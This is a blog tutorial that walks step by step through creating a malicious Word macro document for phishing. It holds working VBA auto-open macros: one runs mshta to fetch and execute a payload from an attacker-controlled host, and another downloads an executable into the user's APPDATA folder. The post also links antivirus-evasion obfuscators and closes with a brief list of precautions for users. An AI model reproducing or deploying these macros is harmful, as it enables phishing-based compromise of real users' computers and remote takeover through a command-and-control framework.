---
title: "Create malicious office documents (Macro attack)"
date: "2020-04-19"
layout: single
tags:
- Malware
categories:
- Blog-post
---

Hello world.

This blog post is tend to show how macro attack works. 

In real scenario, attacker may phishing user by email user with some sort of business or organization matter etc., if user download and execute those malicious file, their machine then will be compromised.

Successful rate for this macro attack being detected by AntiVirus is depend on how the obfuscation of the macro and the Antivirus(AV) signature itself. It's look like the more obfuscation made by attacker, the lower the chance of their malware being detected by AV. One of the popular malware using this type of attack is Emotet malware. They use macro attack to drop their payload, and then execute the executable at the end of the process.

Picture below from CyberReason show how of Emotet malware works.

![enter image description here](https://lh6.googleusercontent.com/2NuozHdR7FXjw0eHCtSOa0kJyTgTGbC1Q64bhXNi1gOCRW7lHJfrb8SnAXaN6wjY9BKmsd0RwekmY1y-fCk21CVv2CBmMPBMQb9iGDghRfLCZ8GfrN0DSRm6GH0D8Fc7HH2-iKpH)

We gonna create a basic malicious document attack that will execute mshta payload (without any obfuscation made) whenever user open our malicious document.

This blog post is for education and research purpose only. If you do something bad, do with your own risk.

## Create document file in Microsoft Word

We will create a word file first and at the end of this tutorial save it as `.doc`. 

Maybe as an attacker, they will display a message to phishing user to click `enable editing` and `enable content` of the document like below picture.

![pic1](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maliciousdoc/pic1.png)

## Create macro 

Click on 'view" tab

![//pic2](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maliciousdoc/pic2.png)

Click Macros

![//pic3](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maliciousdoc/pic3.PNG)

Type any name you want for Macro name and click "create" to create the macro

![//pic4](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maliciousdoc/pic4.PNG)

On "Project" path, click ThisDocument

![//pic5](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maliciousdoc/pic5.PNG)

### Execute command

Write our malicious macro code like below

```
Private Sub Document_Open()
Test
End Sub

Private Sub DocumentOpen()
Test
End Sub

Private Sub Auto_Open()
Test
End Sub

Private Sub AutoOpen()
Test
End Sub

Private Sub Auto_Exec()
Test
End Sub

Private Sub Test()
    Shell ("cmd /c mshta http://192.168.83.129:9999/TPXfI")
End Sub
```
![//pic6](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maliciousdoc/pic6.PNG)

You can also use other payload command line like powershell etc. The mshta attack is just an example.

In my case here, this macro will execute mshta fileless payload.

### Download file
```
Private Sub Document_Open()
Test
End Sub

Private Sub DocumentOpen()
Test
End Sub

Private Sub Auto_Open()
Test
End Sub

Private Sub AutoOpen()
Test
End Sub

Private Sub Auto_Exec()
Test
End Sub

Private Sub Test()
'
Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
xHttp.Open "GET", "https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe", False
xHttp.Send
With bStrm
    .Type = 1
    .Open
    .write xHttp.responseBody
    .savetofile Environ("APPDATA") & "\malware.exe", 2
End With
'
'
End Sub
```

### More option and resource of macro script
- https://gist.github.com/mgeeky/3c705560c5041ab20c62f41e917616e6
- https://github.com/mgeeky/VisualBasicObfuscator
- https://gist.github.com/mgeeky/9dee0ac86c65cdd9cb5a2f64cef51991
- https://blog.f-secure.com/dechaining-macros-and-evading-edr/


## Save as .doc

We gonna choose `.doc` or `.docm` file format to save this document because this type of document support to execute macro attack.

![//pic7](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maliciousdoc/pic7.PNG)

Now, we can deliver this malicious document to target user.


# User execute and enable content
Once user open the document and enable content of our malicious document, the user will be compromised.

Take a look at below gif on how it works.

![//pic8.gif](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maliciousdoc/pic8.gif)

Koadic now has take control our target user.

# User (victim) precaution
- Verify sender address thoroughly
- Ensure Antivirus is legitimate and updated
- Take a precautionary measures like do not click "enable content" when opening `.doc` or `.docm` document format.
